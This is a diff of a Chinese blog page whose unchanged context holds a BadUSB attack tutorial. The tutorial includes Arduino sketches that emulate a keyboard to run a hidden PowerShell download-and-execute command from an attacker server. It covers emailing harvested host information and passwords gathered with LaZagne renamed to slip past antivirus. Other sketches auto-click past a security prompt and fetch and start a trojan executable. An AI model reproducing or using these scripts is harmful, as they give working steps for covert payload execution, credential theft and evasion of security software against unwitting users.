@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.2">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -42,8 +42,8 @@
 <meta property="og:image" content="https://sunian19.github.io/imgss/tu65.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/tu66.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/tu67.png">
-<meta property="article:published_time" content="2019-11-29T01:25:04.000Z">
-<meta property="article:modified_time" content="2020-04-06T05:21:42.000Z">
+<meta property="article:published_time" content="2019-11-29T17:25:04.000Z">
+<meta property="article:modified_time" content="2024-01-18T16:56:05.285Z">
 <meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="BadUSB">
@@ -166,7 +166,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#hid-gong-ji-yuan-li"><span class="nav-number">1.</span> <span class="nav-text">HID攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ying-jian-zhun-bei"><span class="nav-number">2.</span> <span class="nav-text">硬件准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#han-shu-jie-shao"><span class="nav-number">3.</span> <span class="nav-text">函数介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ruan-jian-qu-dong-zhun-bei"><span class="nav-number">4.</span> <span class="nav-text">软件驱动准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ce-shi-jiao-ben"><span class="nav-number">5.</span> <span class="nav-text">测试脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ti-huan-qi-ta-jiao-ben"><span class="nav-number">6.</span> <span class="nav-text">替换其他脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arduino-dai-ma"><span class="nav-number">7.</span> <span class="nav-text">Arduino代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zong-jie"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kuo-zhan-dai-ma"><span class="nav-number">9.</span> <span class="nav-text">扩展代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qi-ta-guo-gou-dai-ma-zi-xing-yan-jiu"><span class="nav-number">10.</span> <span class="nav-text">其他过狗代码，自行研究</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mian-sha-ban-ben-yi-zhi-zuo-cheng-gong-guo-360-dian-nao-guan-jia-huo-rong-zi-liao-zhi-zai-zhi-shi-xing-qiu-fa-fang"><span class="nav-number">11.</span> <span class="nav-text">免杀版本已制作成功，过360、电脑管家、火绒，资料只在知识星球发放</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HID%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">HID攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AC%E4%BB%B6%E5%87%86%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">硬件准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.</span> <span class="nav-text">函数介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AF%E4%BB%B6%E9%A9%B1%E5%8A%A8%E5%87%86%E5%A4%87"><span class="nav-number">4.</span> <span class="nav-text">软件驱动准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC"><span class="nav-number">5.</span> <span class="nav-text">测试脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E5%85%B6%E4%BB%96%E8%84%9A%E6%9C%AC"><span class="nav-number">6.</span> <span class="nav-text">替换其他脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arduino%E4%BB%A3%E7%A0%81"><span class="nav-number">7.</span> <span class="nav-text">Arduino代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E4%BB%A3%E7%A0%81"><span class="nav-number">9.</span> <span class="nav-text">扩展代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%BF%87%E7%8B%97%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%87%AA%E8%A1%8C%E7%A0%94%E7%A9%B6"><span class="nav-number">10.</span> <span class="nav-text">其他过狗代码，自行研究</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E7%89%88%E6%9C%AC%E5%B7%B2%E5%88%B6%E4%BD%9C%E6%88%90%E5%8A%9F%EF%BC%8C%E8%BF%87360%E3%80%81%E7%94%B5%E8%84%91%E7%AE%A1%E5%AE%B6%E3%80%81%E7%81%AB%E7%BB%92%EF%BC%8C%E8%B5%84%E6%96%99%E5%8F%AA%E5%9C%A8%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E5%8F%91%E6%94%BE"><span class="nav-number">11.</span> <span class="nav-text">免杀版本已制作成功，过360、电脑管家、火绒，资料只在知识星球发放</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -181,7 +181,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">98</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -192,7 +192,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -284,14 +284,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2019-11-29 09:25:04" itemprop="dateCreated datePublished" datetime="2019-11-29T09:25:04+08:00">2019-11-29</time>
+      <time title="创建时间：2019-11-29 09:25:04" itemprop="dateCreated datePublished" datetime="2019-11-29T09:25:04-08:00">2019-11-29</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-04-06 13:21:42" itemprop="dateModified" datetime="2020-04-06T13:21:42+08:00">2020-04-06</time>
+        <time title="修改时间：2024-01-18 08:56:05" itemprop="dateModified" datetime="2024-01-18T08:56:05-08:00">2024-01-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -321,17 +321,17 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h3 id="hid-gong-ji-yuan-li" id="HID攻击原理">HID攻击原理</h3>
+        <h3 id="HID攻击原理">HID攻击原理</h3>
 <p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。简而言之，今天要介绍的Badusb利用的是虚拟键盘来实现恶意代码的执行。</p>
-<a id="more"></a>
-<h3 id="ying-jian-zhun-bei" id="硬件准备">硬件准备</h3>
+<span id="more"></span>
+<h3 id="硬件准备">硬件准备</h3>
 <p>(购买板子或购买有外壳的）<br>
 <a target="_blank" rel="noopener" href="https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473">https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473</a><br>
 <a target="_blank" rel="noopener" href="https://m.tb.cn/h.eFDEFMN?sm=e737b6">https://m.tb.cn/h.eFDEFMN?sm=e737b6</a></p>
-<h3 id="han-shu-jie-shao" id="函数介绍">函数介绍</h3>
+<h3 id="函数介绍">函数介绍</h3>
 <p>Arduino IDE中使用的开发语言是C，一个程序在Arduino IDE中被成为 sketch，每个 sketch 都包含一个 setup 函数和一个 loop 函数。程序启动，首先调用 setup，这个函<br>
 数只被调用一次，loop 函数会被不停的重复调用下去。</p>
-<h3 id="ruan-jian-qu-dong-zhun-bei" id="软件驱动准备">软件驱动准备</h3>
+<h3 id="软件驱动准备">软件驱动准备</h3>
 <p>编译器Arduino IDE，Teensyduino驱动，arduino驱动<br>
 （百度云盘直接下载ZIP，解压即可使用）<br>
 链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/16lDkrlxU9BpCD7kKgGhJng">https://pan.baidu.com/s/16lDkrlxU9BpCD7kKgGhJng</a><br>
@@ -347,7 +347,7 @@ Teensyduino安装，特别注意编译器版本需要在1.6.4以下<br>
 中途可能会出错，我重启下电脑就好了（没搞懂，报错说是不为管理员启动安装或杀毒软件运行）<br>
 可能这就是玄学重启吧<br>
 <img src="/imgss/tu58.png" alt=""></p>
-<h3 id="ce-shi-jiao-ben" id="测试脚本">测试脚本</h3>
+<h3 id="测试脚本">测试脚本</h3>
 <p>打开编译器，测试脚本（循环模式2秒写一个hello world）</p>
 <blockquote>
 <p>void setup() {<br>
@@ -363,7 +363,7 @@ Keyboard.print(“Hello World”);  // 模拟键盘输入</p>
 先验证再上传<br>
 录入成功<br>
 <img src="/imgss/tu60.png" alt=""></p>
-<h3 id="ti-huan-qi-ta-jiao-ben" id="替换其他脚本">替换其他脚本</h3>
+<h3 id="替换其他脚本">替换其他脚本</h3>
 <p>为确保我们的脚本能够完美地发送包含目标主机信息的邮件，我们需要开启smtp邮箱服务。本处我使用的是QQ邮箱，开启方法如下：<br>
 进入邮箱，点击设置-账户<br>
 <img src="/imgss/tu61.png" alt=""><br>
@@ -380,7 +380,7 @@ Keyboard.print(“Hello World”);  // 模拟键盘输入</p>
 修改GetPass.ps1中的前两行，域名，Getpass.rar实际上是lazagne，用rar下载尽量避免触发安全软件，这个不放心可以百度下载。command.rar实为bat 因为 lazagne注入lsass时会被安全软件拦截，所以用bat避免注入。修改GetPass.ps1中的邮箱配置，同main.ps1中的就行<br>
 <img src="/imgss/tu66.png" alt=""><br>
 将修改后的文件（共四个）上传到公网服务器，如利用Xshell，FinalShell等工具直接拖拽上传</p>
-<h3 id="arduino-dai-ma" id="Arduino代码">Arduino代码</h3>
+<h3 id="Arduino代码">Arduino代码</h3>
 <p>1.打开Arduino IDE<br>
 2.工具-&gt;版-&gt;选择&quot;Arduino Leonardo&quot;<br>
 3，port选择COM3<br>
@@ -435,14 +435,14 @@ void loop() {}</p>
 </blockquote>
 <p>将代码中的8.8.8.8改为自己服务器IP<br>
 其实最主要的还是免杀。。。。。</p>
-<h3 id="zong-jie" id="总结">总结</h3>
+<h3 id="总结">总结</h3>
 <p>遇到困难不要轻易放弃，奥力给！百度/谷歌都是很好的帮手，另外思路要活。比如powershell默认设置是Restricted(脚本不能运行)，但是我们可以打开 运行 ，通过它来运行powershell脚本而不是打开powershell运行脚本，还有就是最后被拦截一样，换个思路，不一定要免杀马那么复杂的东西，运用badusb的特性一样可以绕过。</p>
-<h3 id="kuo-zhan-dai-ma" id="扩展代码">扩展代码</h3>
+<h3 id="扩展代码">扩展代码</h3>
 <p>通过修改x，y的值，可通过模拟鼠标点击，绕过沙雕腾讯电脑管家</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">long basic;</span><br><span class="line">long x;</span><br><span class="line">long y;</span><br><span class="line">String powershell;</span><br><span class="line"></span><br><span class="line">void setup()</span><br><span class="line">&#123;</span><br><span class="line">  basic=9999999; </span><br><span class="line">  x=5000000;</span><br><span class="line">  y=5000000;</span><br><span class="line">  powershell=<span class="string">&quot;powershell.exe  -WindowStyle Hidden -NoLogo  IEX (New-Object Net.WebClient).DownloadString(&#x27;http://xxx.xxx.xxx.xxx/main.ps1&#x27;);&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  Keyboard.begin();</span><br><span class="line">  Mouse.begin();</span><br><span class="line"></span><br><span class="line">  keyboard_gui();</span><br><span class="line">  keyboard_powershell();</span><br><span class="line">  mouse();</span><br><span class="line"></span><br><span class="line">  Mouse.end();</span><br><span class="line">  Keyboard.end();</span><br><span class="line">&#125;</span><br><span class="line">void keyboard_gui()</span><br><span class="line">&#123;</span><br><span class="line">  Keyboard.begin();</span><br><span class="line">  delay(1000);</span><br><span class="line">  delay(500);</span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI); </span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.press(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.releaseAll();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void keyboard_powershell()</span><br><span class="line">&#123;</span><br><span class="line">  Keyboard.println(powershell);</span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.press(KEY_RETURN);</span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.release(KEY_RETURN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mouse()</span><br><span class="line">&#123;</span><br><span class="line">  delay(500);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,0,0);</span><br><span class="line">  Mouse.move(0,-basic,0);  </span><br><span class="line">  Mouse.move(basic,basic,0);</span><br><span class="line">  Mouse.move(basic,0,0);</span><br><span class="line">  Mouse.move(x,y,0); </span><br><span class="line">  Mouse.click();</span><br><span class="line">  delay(500);</span><br><span class="line">  Mouse.click();</span><br><span class="line">  delay(500);</span><br><span class="line">  Mouse.click();</span><br><span class="line">&#125;</span><br><span class="line">void <span class="function"><span class="title">loop</span></span>() &#123;&#125;</span><br></pre></td></tr></table></figure></div>
-<h3 id="qi-ta-guo-gou-dai-ma-zi-xing-yan-jiu" id="其他过狗代码，自行研究">其他过狗代码，自行研究</h3>
+<h3 id="其他过狗代码，自行研究">其他过狗代码，自行研究</h3>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line">void <span class="function"><span class="title">setup</span></span>() &#123;//初始化</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(1000);//延时</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(<span class="string">&#x27;r&#x27;</span>);//r键</span><br><span class="line">delay(300);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//释放win 键</span><br><span class="line">Keyboard.release(<span class="string">&#x27;r&#x27;</span>);//释放R键</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);//切换大小写，绕过输入法</span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.println(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">&quot;powershell&quot;</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">&quot;<span class="variable">$clnt</span> = new-object System.Net.WebClient;&quot;</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">&quot;<span class="variable">$url</span>= &#x27;**********木马地址******&#x27;; &quot;</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">&quot;<span class="variable">$file</span> = &#x27; D:\\server.exe&#x27;; &quot;</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">&quot;<span class="variable">$clnt</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>); &quot;</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">&quot;START D:\\server.exe &quot;</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.release(KEY_RETURN);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.end();//结束键盘通讯</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">loop</span></span>()&#123;&#125;//循环</span><br></pre></td></tr></table></figure></div>
-<h3 id="mian-sha-ban-ben-yi-zhi-zuo-cheng-gong-guo-360-dian-nao-guan-jia-huo-rong-zi-liao-zhi-zai-zhi-shi-xing-qiu-fa-fang" id="免杀版本已制作成功，过360、电脑管家、火绒，资料只在知识星球发放">免杀版本已制作成功，过360、电脑管家、火绒，资料只在知识星球发放</h3>
+<h3 id="免杀版本已制作成功，过360、电脑管家、火绒，资料只在知识星球发放">免杀版本已制作成功，过360、电脑管家、火绒，资料只在知识星球发放</h3>
 
     </div>
 
@@ -488,7 +488,7 @@ void loop() {}</p>
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
